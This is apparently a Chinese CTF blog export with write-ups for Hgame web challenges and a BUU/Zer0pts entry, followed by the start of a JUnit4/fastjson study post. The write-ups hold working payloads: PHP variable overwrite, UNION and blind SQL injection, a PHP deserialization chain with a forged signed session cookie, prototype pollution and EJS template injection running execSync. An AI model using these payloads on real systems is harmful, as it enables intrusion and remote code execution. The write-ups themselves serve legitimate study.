<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;3a053ba1-1ae6-4030-8c67-3cacb6336ad7.node3.buuoj.cn&#x2F;index.php&#x2F;config.php&#x2F;%81?source</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="image-20201124125355533.png" alt="image-20201124125355533"></p>
<h1 id="phpNantokaAdmin"><a href="#phpNantokaAdmin" class="headerlink" title="phpNantokaAdmin"></a>phpNantokaAdmin</h1><h1 id="MusicBlog"><a href="#MusicBlog" class="headerlink" title="MusicBlog"></a>MusicBlog</h1><p>这里主要是用到了一个trick，关于HTML的一个细节。当HTML出现&lt;a/xxx&gt;的情况下，则会默认只解析前半部分，而不会解析后面的part，具体例子如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">title</span>&gt;</span>基础柱状图<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> &gt;</span> 123123123123<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">a</span>/<span class="attr">bcde</span>&gt;</span>123<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>但在解析种，依然会将后者解析变成a标签。</p>
<p>回到题目来说，只需要我们通过该特质+href即可完成跨域绕过</p>
<p>详细文章：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;guokeya.github.io&#x2F;post&#x2F;rFsNvBC3x&#x2F;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;bugs.php.net&#x2F;bug.php?id&#x3D;78814</span><br></pre></td></tr></table></figure>



<p><img src="Zer0pts2020/image-20201202150825012.png" alt="image-20201202150825012"></p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>hgame</title>
    <url>/2021/02/24/hgame/</url>
    <content><![CDATA[<p>Hgame</p>
<p>题目出得都挺好的..</p>
<h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><h2 id="Hitchhiking-in-the-Galaxy"><a href="#Hitchhiking-in-the-Galaxy" class="headerlink" title="Hitchhiking_in_the_Galaxy"></a>Hitchhiking_in_the_Galaxy</h2><p>各种抓包就好了</p>
<h2 id="简单且上头的游戏"><a href="#简单且上头的游戏" class="headerlink" title="简单且上头的游戏"></a>简单且上头的游戏</h2><p>JS里面可以找到，但是也可以通过改分辨率真的玩游戏</p>
<h2 id="宝藏走私者"><a href="#宝藏走私者" class="headerlink" title="宝藏走私者"></a>宝藏走私者</h2><p>HTTP走私，已经写过了</p>
<h2 id="智商检测鸡"><a href="#智商检测鸡" class="headerlink" title="智商检测鸡"></a>智商检测鸡</h2><p>一个脚本题目</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> requests.cookies <span class="keyword">import</span> RequestsCookieJar</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># import json</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到问题</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getQuestion</span>(<span class="params">content</span>):</span></span><br><span class="line">    </span><br><span class="line">    soup=BeautifulSoup(content,<span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">	<span class="comment">#print soup.prettify()</span></span><br><span class="line">    a=soup.find_all(<span class="string">&#x27;mo&#x27;</span>)</span><br><span class="line">    b=soup.find_all(<span class="string">&#x27;mi&#x27;</span>)</span><br><span class="line">    c=soup.find_all(<span class="string">&#x27;mn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    sx=a[<span class="number">1</span>].string+c[<span class="number">0</span>].string</span><br><span class="line">    xx=c[<span class="number">1</span>].string</span><br><span class="line">    sc=c[<span class="number">2</span>].string+<span class="string">&quot;*&quot;</span>+b[<span class="number">0</span>].string+a[<span class="number">3</span>].string+c[<span class="number">3</span>].string</span><br><span class="line">    print(<span class="string">&quot;sc=&#123;&#125;,sx=&#123;&#125;,xx=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(sc,sx,xx))</span><br><span class="line">    <span class="comment"># print(sx+&quot;:&quot;+xx+&quot;:&quot;+sc)</span></span><br><span class="line">    x=symbols(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">    answer=<span class="built_in">float</span>(integrate(sc,(<span class="string">&#x27;x&#x27;</span>,sx,xx)))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># print(answer)</span></span><br><span class="line">    <span class="keyword">return</span> answer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(res)</span></span><br><span class="line"><span class="comment"># &#123;&quot;answer&quot;:-42927&#125;</span></span><br><span class="line"><span class="comment"># &#123;&quot;answer&quot;:&quot;-42927&quot;&#125;</span></span><br><span class="line"><span class="comment"># 回答问题</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">answer,cookies</span>):</span></span><br><span class="line">    verify = <span class="string">&quot;http://r4u.top:5000/api/verify&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,<span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;session=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(cookies)&#125;</span><br><span class="line">    data = &#123;<span class="string">&quot;answer&quot;</span>: <span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(answer)&#125;</span><br><span class="line">    res2 = requests.post(verify, data=json.dumps(data),headers=headers)</span><br><span class="line">    </span><br><span class="line">    cookies = res2.cookies[<span class="string">&#x27;session&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> cookies</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(integrate(18 * x + 18, (&#x27;x&#x27;, -68, 83)))</span></span><br><span class="line"><span class="comment"># 先进行顶一次访问拿到cookies</span></span><br><span class="line">cookies = verify(<span class="number">1</span>,<span class="string">&quot;sss&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">    <span class="comment"># print(answer)</span></span><br><span class="line">    Question = <span class="string">&quot;http://r4u.top:5000/api/getQuestion&quot;</span></span><br><span class="line">    print(cookies)</span><br><span class="line">    header = &#123;<span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;session=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(cookies)&#125;</span><br><span class="line">    res = requests.get(Question,headers=header)</span><br><span class="line">    content = res.text</span><br><span class="line">    <span class="comment"># 得到答案</span></span><br><span class="line">    answer = getQuestion(content)</span><br><span class="line"></span><br><span class="line">    verify = <span class="string">&quot;http://r4u.top:5000/api/verify&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,<span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;session=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(cookies)&#125;</span><br><span class="line">    data = &#123;<span class="string">&quot;answer&quot;</span>: <span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(answer)&#125;</span><br><span class="line">    res2 = requests.post(verify, data=json.dumps(data),headers=headers)</span><br><span class="line">    print(res2.text)</span><br><span class="line">    </span><br><span class="line">    cookies = res2.cookies[<span class="string">&#x27;session&#x27;</span>]</span><br><span class="line">    print(cookies)</span><br><span class="line">    print(answer)</span><br></pre></td></tr></table></figure>



<h1 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h1><h2 id="懒狗R4u"><a href="#懒狗R4u" class="headerlink" title="懒狗R4u"></a>懒狗R4u</h2><p>可以拿下源码<a href="http://www.zip/">www.zip</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$filter = [<span class="string">&quot;SESSION&quot;</span>, <span class="string">&quot;SEVER&quot;</span>, <span class="string">&quot;COOKIE&quot;</span>, <span class="string">&quot;GLOBALS&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 直接注册所有变量，这样我就能少打字力，芜湖~</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_GET&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>) <span class="keyword">as</span> $_request)&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_k =&gt; $_v)&#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($filter <span class="keyword">as</span> $youBadBad)&#123;</span><br><span class="line">            $_k = str_replace($youBadBad, <span class="string">&#x27;&#x27;</span>, $_k);</span><br><span class="line">        &#125;</span><br><span class="line">        $&#123;$_k&#125; = $_v;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很经典的变量覆盖了，过滤只不过是变空，这样子构造Payload ?_SSSSESIONESION[username]=admin</p>
<p>即可</p>
<h2 id="200OK！"><a href="#200OK！" class="headerlink" title="200OK！"></a>200OK！</h2><p>一道简单的注入题目，做的时候想复杂了，后来才意识到那么简单</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://200ok.liki.link/server.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># headers =&#123;&quot;Status&quot;:&quot;-1&#x27;/**/Union/**/Select/**/database() #&quot;&#125;</span></span><br><span class="line">headers =&#123;<span class="string">&quot;Status&quot;</span>:<span class="string">&quot;-1&#x27;/**/Union/**/Select/**/group_concat(table_name)/**/From(information_schema.tables)/**/Where(table_schema=&#x27;week2sqli&#x27;) #&quot;</span>&#125;</span><br><span class="line">headers =&#123;<span class="string">&quot;Status&quot;</span>:<span class="string">&quot;-1&#x27;/**/Union/**/Select/**/group_concat(column_name)/**/From(information_schema.columns)/**/Where(table_schema=&#x27;week2sqli&#x27;) #&quot;</span>&#125;</span><br><span class="line">headers =&#123;<span class="string">&quot;Status&quot;</span>:<span class="string">&quot;-1&#x27;/**/Union/**/Select/**/ffffff14gggggg/**/From/**/f1111111144444444444g #&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">res = requests.get(url, headers=headers).text</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag = &quot;&quot;</span></span><br><span class="line"><span class="comment"># for i in range(1, 999):</span></span><br><span class="line"><span class="comment">#     # for j in stringlist:</span></span><br><span class="line"><span class="comment">#     for j in range(40, 126):</span></span><br><span class="line"><span class="comment">#         # sql = &quot;1=(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;.format(i,j)</span></span><br><span class="line"><span class="comment">#         # sql = &quot;1=(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;geek&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;.format(i,j)</span></span><br><span class="line"><span class="comment">#         # sql = &quot;1=(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;.format(</span></span><br><span class="line"><span class="comment">#         #     i, j)</span></span><br><span class="line"><span class="comment">#         sql = &quot;1&#x27;||if(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0)  #&quot;.format(i,j)</span></span><br><span class="line"><span class="comment">#         sql = &quot;1&#x27;||if(ascii(substr(select(group_concat(table_name)from(information_schema.tables) where(table_schema)=database()),&#123;&#125;,1))&gt;&#123;&#125;,1,0)  #&quot;.format(i,j)</span></span><br><span class="line"><span class="comment">#         headers = &#123;&quot;Status&quot;: sql&#125;</span></span><br><span class="line"><span class="comment">#         res = requests.get(url=url, headers=headers)</span></span><br><span class="line"><span class="comment">#         # print(data)</span></span><br><span class="line"><span class="comment">#         if &quot;NETWORK ERROR&quot; in res.text:</span></span><br><span class="line"><span class="comment">#             print(j)</span></span><br><span class="line"><span class="comment">#             flag += chr(j)</span></span><br><span class="line"><span class="comment">#             print(flag)</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"><span class="comment">#     if i == 30:</span></span><br><span class="line"><span class="comment">#         sys.exit()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># database: week2sql</span></span><br></pre></td></tr></table></figure>



<h1 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h1><h2 id="Arknights"><a href="#Arknights" class="headerlink" title="Arknights"></a>Arknights</h2><p>在git泄露 可以下载出源码，</p>
<p>很简单的就可以找到：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Eeeeeeevallllllll</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $msg=<span class="string">&quot;坏坏liki到此一游&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;msg;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接下来就去找toString，也很简单：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CardsPool</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $cards;</span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">&#x27;1.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file=$file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">draw</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $rand = mt_rand(<span class="number">1</span>, <span class="number">100</span>);</span><br><span class="line">        $level = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($rand &gt;= <span class="number">1</span> &amp;&amp; $rand &lt;= <span class="number">42</span>) &#123;</span><br><span class="line">            $level = <span class="number">3</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($rand &gt;= <span class="number">43</span> &amp;&amp; $rand &lt;= <span class="number">90</span>) &#123;</span><br><span class="line">            $level = <span class="number">4</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($rand &gt;= <span class="number">91</span> &amp;&amp; $rand &lt;= <span class="number">99</span>) &#123;</span><br><span class="line">            $level = <span class="number">5</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($rand == <span class="number">100</span>) &#123;</span><br><span class="line">            $level = <span class="number">6</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $rand_key = array_rand(<span class="keyword">$this</span>-&gt;cards[$level]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;stars&quot;</span> =&gt; $level,</span><br><span class="line">            <span class="string">&quot;No&quot;</span> =&gt; $rand_key,</span><br><span class="line">            <span class="string">&quot;card&quot;</span> =&gt; <span class="keyword">$this</span>-&gt;cards[$level][$rand_key]</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cards = <span class="keyword">include</span>(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后就找个能触发反序列化的地方：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $sessionData;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> SECRET_KEY = <span class="string">&quot;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params">$key, $value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($key))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sessionData[] = $value;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sessionData[$key] = $value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAll</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;sessionData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        $serialized = serialize(<span class="keyword">$this</span>-&gt;sessionData);</span><br><span class="line">        $sign = base64_encode(md5($serialized . <span class="built_in">self</span>::SECRET_KEY));</span><br><span class="line">        $value = base64_encode($serialized) . <span class="string">&quot;.&quot;</span> . $sign;</span><br><span class="line"></span><br><span class="line">        setcookie(<span class="string">&quot;session&quot;</span>,$value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">extract</span>(<span class="params">$session</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        $sess_array = explode(<span class="string">&quot;.&quot;</span>, $session);</span><br><span class="line">        $data = base64_decode($sess_array[<span class="number">0</span>]);</span><br><span class="line">        $sign = base64_decode($sess_array[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($sign === md5($data . <span class="built_in">self</span>::SECRET_KEY))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sessionData = unserialize($data);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;sessionData);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Go away! You hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正好就有，只需要我们的session符合他的规则就可以构造反序列化了，那么构造Payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$Eval = <span class="keyword">new</span> Eeeeeeevallllllll();</span><br><span class="line">$card = <span class="keyword">new</span> CardsPool(<span class="string">&#x27;./flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> SECRET_KEY= <span class="string">&quot;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$Eval-&gt;msg=$card;</span><br><span class="line"></span><br><span class="line">$serialized = serialize($Eval);</span><br><span class="line">$sign = base64_encode(md5($serialized . SECRET_KEY));</span><br><span class="line">$value = base64_encode($serialized) . <span class="string">&quot;.&quot;</span> . $sign;</span><br><span class="line"><span class="keyword">echo</span> $value;</span><br></pre></td></tr></table></figure>

<p>这样得到答案</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">TzoxNzoiRWVlZWVlZXZhbGxsbGxsbGwiOjE6e3M6MzoibXNnIjtPOjk6IkNhcmRzUG9vbCI6Mjp7czo1OiJjYXJkcyI7TjtzOjE1OiIAQ2FyZHNQb29sAGZpbGUiO3M6MTA6Ii4vZmxhZy5waHAiO319.ZjgzNzJjMDVlNTI3MGRlZTRiYjg4NDQxNWNhZGZiNDA=</span><br></pre></td></tr></table></figure>



<h2 id="Forgetful"><a href="#Forgetful" class="headerlink" title="Forgetful"></a>Forgetful</h2><p>SSTI的题目，几乎没有过滤，直接拿下，参考我以前的文章payload可以直接打通</p>
<h1 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h1><h2 id="漫无止境的星期日"><a href="#漫无止境的星期日" class="headerlink" title="漫无止境的星期日"></a>漫无止境的星期日</h2><p>JS原型链污染+ejs的模板注入</p>
<p>在static/<a href="http://www.zip/">www.zip</a> 下面可以拿到源码：</p>
<p>重点代码在这里：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.all(<span class="string">&#x27;/wish&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.session.crying) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(<span class="string">&quot;forbidden.&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> wishes = req.body.wishes</span><br><span class="line">        req.session.wishes = ejs.render(<span class="string">`&lt;div class=&quot;wishes&quot;&gt;<span class="subst">$&#123;wishes&#125;</span>&lt;/div&gt;`</span>)</span><br><span class="line">        <span class="keyword">return</span> res.redirect(<span class="number">302</span>, <span class="string">&#x27;/show&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.render(<span class="string">&#x27;wish&#x27;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>这里可以通过模板注入，但是必须完成前置条件，得到session.crying，所以往前找</p>
<p>代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.all(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> data = &#123; <span class="attr">name</span>: <span class="string">&quot;&quot;</span>, <span class="attr">discription</span>: <span class="string">&quot;&quot;</span> &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.ip === <span class="string">&quot;::ffff:127.0.0.1&quot;</span>) &#123;</span><br><span class="line">        data.crying = <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">Object</span>.keys(req.body).forEach(<span class="function">(<span class="params">key</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (key !== <span class="string">&quot;crying&quot;</span>) &#123;</span><br><span class="line">                data[key] = req.body[key]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        req.session.crying = data.crying</span><br><span class="line">        req.session.name = data.name</span><br><span class="line">        req.session.discription = data.discription</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res.redirect(<span class="number">302</span>, <span class="string">&#x27;/show&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.render(<span class="string">&#x27;loop&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>核心代码就是在他循环遍历这一段，会将crying进行一次设置，直接原型链污染：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123; <span class="string">&quot;name&quot;</span>: <span class="string">&quot;123&quot;</span>,<span class="string">&quot;discription&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;crying&quot;</span>:<span class="string">&quot;123&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>这样子就可以取到session，ejs模板注入的部分看官方文档即可：</p>
<p><img src="image-20210301121605408.png" alt="image-20210301121605408"></p>
<p>= =发现他就直接执行代码的，那么很简单的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">wishes=&lt;%- <span class="built_in">global</span>.process.mainModule.require(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;ls /&#x27;</span>) %&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>fastJson</title>
    <url>/2020/11/02/fastJson/</url>
    <content><![CDATA[<h1 id="JUnit4"><a href="#JUnit4" class="headerlink" title="JUnit4"></a>JUnit4</h1><p>在学习fastjson之前，感觉有必要先学习一下Junit4的注解，自从SpringBoot之后注解大量的被使用，</p>
<p>JUnit出现的与因为main方法测试很不方便，摘自百度的部分：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">用main方法测试的话就很不方便，想测试全部方法的话就得把测试代码全部写到里，或者你测一个重写一次。且更重要的是，这样会使测试代码与运行逻辑代码混在一起，不规范。</span><br><span class="line">使用junit就方便多了,这是单元测试，你想测哪个方法就写一个对应的测试方法，然后用junit运行。每个方法之间是独立的，非常灵活。而且测试方法一般不会直接写在原类中，而是单独的测试类，这样测试代码就完全与逻辑代码分开了。	</span><br></pre></td></tr></table></figure>

<p>而在Junit4大量使用了从Java5中开始使用的注解，如下是JUnit4常用的注解：</p>
<h2 id="before，test，after"><a href="#before，test，after" class="headerlink" title="before，test，after"></a>before，test，after</h2><ul>
<li><p>Before：初始化方法，针对每个测试方法，都会执行一遍</p>
</li>
<li><p>Test: 代替main函数，可以让我们灵活的测试某部分代码,注意，测试的时候<strong>不要写一个Test类！！！！</strong>，否则因为会有限选择同包下的test类，导致报错,@Test方法所在类中,<strong>不能存在有参数构造函数,无参构造可以存在</strong></p>
</li>
<li><p>After：在方法结束之后执行，每次都会执行！</p>
</li>
</ul>
<p>例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.After;</span><br><span class="line"><span class="keyword">import</span> org.junit.Before;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;最先被执行！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;wdnmd&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@After</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">after</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我之后才会被执行呢&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>除此之外，Test注解还允许我们添加参数，检测是否抛出某部分异常：</p>
<p>例子：</p>
